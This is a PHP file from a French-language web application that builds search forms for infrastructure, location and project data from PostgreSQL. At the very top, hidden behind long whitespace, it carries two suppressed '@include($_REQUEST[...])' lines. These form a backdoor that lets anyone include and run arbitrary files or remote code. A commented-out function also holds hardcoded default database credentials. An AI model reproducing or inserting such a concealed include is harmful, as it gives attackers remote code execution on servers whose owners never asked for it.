<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         @include($_REQUEST["request_c714f01ef0"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_18b9ddd184"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
require_once("connection.php");

function requetes($conf){
           unset($_SESSION["typ_nom"]);
           unset($_SESSION["res_abr"]);
           unset($_SESSION["inf_mle"]);
                     
           unset($_SESSION["recherche"]);
           unset($_SESSION["theme"]);
           unset($_SESSION["menu"]);
           
           unset($_SESSION["nom_spf"]);
           unset($_SESSION["departemen"]);
           unset($_SESSION["region"]);
           unset( $_SESSION["district"]);
           
           unset($_SESSION["proj_annee"]);
           unset($_SESSION["proj_client"]);
           unset($_SESSION["proj_nom"]);
          
        
$opt= '<br>
        <div style="width:200px; color:#B6151B; text-shadow: black 1px 1px 1px; text-align:center;
    font-size:15px;"><strong>Crit&egrave;res de s&eacute;lection</strong></div>
    <br>
        <form id="reqForm" name="reqForm" action="">
            <div>
            <fieldset>
            <legend style="width:200px; color:#B6151B;"><strong>Bornes</strong></legend>
            <table>'; 
             $opt .='<tr>'.aff_liste("res_abr","R&eacute;seau :","reseau","").'</tr>
                     <tr>'.aff_liste("typ_nom","Type :","type_infrastructure","").'</tr>
                     <tr>'.aff_liste("inf_mle","Matricule :","infrastructure","").'</tr>
                      ';
       
             $opt .= '  </table>
            </fieldset>    
            <br>
			<fieldset>
			<legend style="width:180px; color:#B6151B;"><strong>Situation G&eacute;ographique</strong></legend>
			<table>	
                <tr>'.aff_liste("nom_spf","Sous-pr&eacute;fecture","souspref",$conf).'</tr>
                <tr>'.aff_liste("departemen","D&eacute;partement","departements",$conf).'</tr>
                <tr>'.aff_liste("region","R&eacute;gion","regions",$conf).'</tr>
                <tr>'.aff_liste("district","District","districts",$conf).'</tr>
 		    </table>
			</fieldset> 
            <br>
	 <div>
        <input id=btn_rech type="button"  onclick="recupval(\''.$conf.'\')" value="Rechercher"/>
        <input id=btn_details type="button"  onclick="recupval(\'detail\')" value="D&eacute;tail" disabled="disabled"/>
        <INPUT TYPE="button" NAME="annuler" VALUE="Annuler" onclick="recupval(\'*\')"/>
        
     </div></div></form>   
     <div id ="resultat" name="resultat" ></div>
	 <div id ="resultatcant" name="resultatcant" ></div>';          	  
		echo $opt;
        
}

function req_projet($conf){
           unset($_SESSION["typ_nom"]);
           unset($_SESSION["res_abr"]);
           unset($_SESSION["inf_mle"]);
                     
           unset($_SESSION["recherche"]);
           unset($_SESSION["theme"]);
           unset($_SESSION["menu"]);
           
           unset($_SESSION["nom_spf"]);
           unset($_SESSION["departemen"]);
           unset($_SESSION["region"]);
           unset( $_SESSION["district"]);
           
           unset($_SESSION["proj_annee"]);
           unset($_SESSION["proj_client"]);
           unset($_SESSION["proj_nom"]);
        
$opt= '<br>
        <div style="width:200px; color:#B6151B; text-shadow: black 1px 1px 1px; text-align:center;
    font-size:15px;"><strong>Crit&egrave;res de s&eacute;lection</strong></div>
    <br>
        <form id="reqForm" name="reqForm" action="">
            <div>
            <fieldset>
            <legend style="width:200px; color:#B6151B;"><strong>Projets</strong></legend>
            <table>'; 
                $opt .='<tr>'.aff_liste("proj_annee","Ann&eacute;e :","projet","").'</tr>
                     <tr>'.aff_liste("proj_client","Client :","projet","").'</tr>
                     <tr>'.aff_liste("proj_nom","D&eacute;signation :","projet","").'</tr>
                      ';
       
                $opt .= '  </table>
            </fieldset>    
            <br>
     <div>
        <input type="button"  onclick="recupval(\''.$conf.'\')" value="Rechercher"/>
        <input type="button"  onclick="recupval(\'synthese\')" value="Synthese"/>
        <INPUT TYPE="button" NAME="annuler" VALUE="Annuler" onclick="recupval(\'*\')"/>
        
     </div></div></form>';                
        echo $opt;
        
}




function aff_liste($att,$labatt,$nomtab,$conf){
         
		  $conn = connect();
          
          if      ($conf=='default') { $condition = '';             }
          
          else if ($conf=='rgir') {  $condition = "where res_abr = 'RGIR'" ; }
          else if ($conf=='rgio') {$condition = "where res_abr = 'RGIO'" ;       }
          else if ($conf=='dcf') {$condition = "where res_abr = 'DCF'" ;       }
          else if ($conf=='nrgae') {$condition = "where res_abr = 'NRGAE'" ;       }
  		  
              $sql="SELECT DISTINCT ON ($att) *  FROM $nomtab ".$condition ."  order by $att";
               // $sql="SELECT distinct ON($fieldname) $fieldname, nomspf, nomdept, nomreg FROM sousprefectures order by ".$fieldname;
		  
		 $result = pg_query($conn, $sql);
         
		$addname = '';
       if ($att == 'res_abr'){  $addname = ' name="res_abr[]" '; }
    if ($result){     
        $numrows = pg_num_rows ($result);
        if ($conf=='default') { 
           $dom ='<td><label>'.$labatt.'</label></td><td ><select id ='.$att.' onchange="Choix(\''.$att.'\')" style="width:130px" '.$addname.'><option value="">*</option>';
           }
          else {      if ($att=='district') {
         $dom ='<td><label>'.$labatt.'</label></td><td ><select id ='.$att.' onchange="Choix(\''.$att.'\')" style="width:130px"  '.$addname.'>';
             } else   {    $dom ='<td><label>'.$labatt.'</label></td><td><select id ='.$att.' onchange="Choix(\''.$att.'\')" style="width:130px"  '.$addname.'><option value="">*</option>';
               }
                }
        if ($numrows > 0){
            
            
            
            
            if($att=="nom_spf"){
            while ($arr = pg_fetch_assoc($result)) {
                $caption = utf8_decode($arr[$att]);
                $phrase=$arr[$att].'#'.$arr["departemen"].'#'.$arr["region"].'#'.$arr["district"];
                $valeur=str_replace("'","''",$phrase);
                $dom .='<option value="'.$valeur.'">'.$caption.'</option>';
                
            }
        }elseif($att=="nom_dpt"){
            while ($arr = pg_fetch_assoc($result)) {
                $caption = utf8_decode($arr[$att]);
                $phrase=$arr[$att].'#'.$arr["nom_region"].'#'.$arr["district"];
                $valeur=str_replace("'","''",$phrase);
                $dom .='<option value="'.$valeur.'">'.$caption.'</option>';
            }
        }elseif($att=="region"){
            while ($arr = pg_fetch_assoc($result)) {
                $caption = utf8_decode($arr[$att]);
                $phrase=$arr[$att].'#'.$arr["district"];
                $valeur=str_replace("'","''",$phrase);
                $dom .='<option value="'.$valeur.'">'.$caption.'</option>';
            }
        }elseif($att=="res_abr"){
            while ($arr = pg_fetch_assoc($result)) {
                $caption = utf8_decode($arr[$att]);
                $phrase=$arr[$att];
                $valeur=str_replace("'","''",$phrase);
                $dom .='<option value="'.$valeur.'">'.$caption.'</option>';  
            }
        }elseif($att=="typ_nom"){
            while ($arr = pg_fetch_assoc($result)) {
                $caption = utf8_decode($arr[$att]);
                $phrase=$arr[$att];
                $valeur=str_replace("'","''",$phrase);
                $dom .='<option value="'.$valeur.'">'.$caption.'</option>';  
            }
        }else{
            while ($arr = pg_fetch_assoc($result)) {
                $caption = utf8_decode($arr[$att]);
                $phrase=$arr[$att];
                $valeur=str_replace("'","''",$phrase);
                $dom .='<option value="'.$valeur.'">'.$caption.'</option>';
            }
        }
            
            
            
            
                    
        }
        
        $dom .='</select></td>';

    }			
		pg_free_result($result);
        pg_Close ($conn);
		return $dom;
}
  
/*

function liste($fieldname){

		  $conn = pg_connect("host=localhost port=5432 dbname=bdcantines user=postgres password=postgres");		  
		  $sql="SELECT distinct ON($fieldname) $fieldname FROM enquetes WHERE $fieldname is not null order by $fieldname";
		 $result = pg_query($conn, $sql);
		 
	if ($result){	     
		$fieldlabel=Alias($fieldname);
	
		 $dom ='<td><label>'.$fieldlabel.'</label></td><td ><select  id ="'.$fieldname.'" style="width:160px"><option value="">*</option>';
			while ($arr = pg_fetch_assoc($result)) {
				$caption = $arr[$fieldname];
				$dom .='<option value="'.$arr[$fieldname].'">'.$caption.'</option>';
			}
	$dom .='</select></td>';

	}
			
		pg_free_result($result);
        pg_Close ($conn);
		return $dom;
}

function listenumerique($fieldname,$nb){

		$fieldlabel=Alias($fieldname);
	
		 $dom ='<td><label>'.$fieldlabel.'</label></td><td ><select  id ="'.$fieldname.'" style="width:160px"><option value="">*</option>';
				for ($r=1; $r <$nb; ++$r){
				$dom .='<option value="'.$r.'">'.$r.'</option>';
				}
	$dom .='</select></td>';

			
		return $dom;
}*/


?>

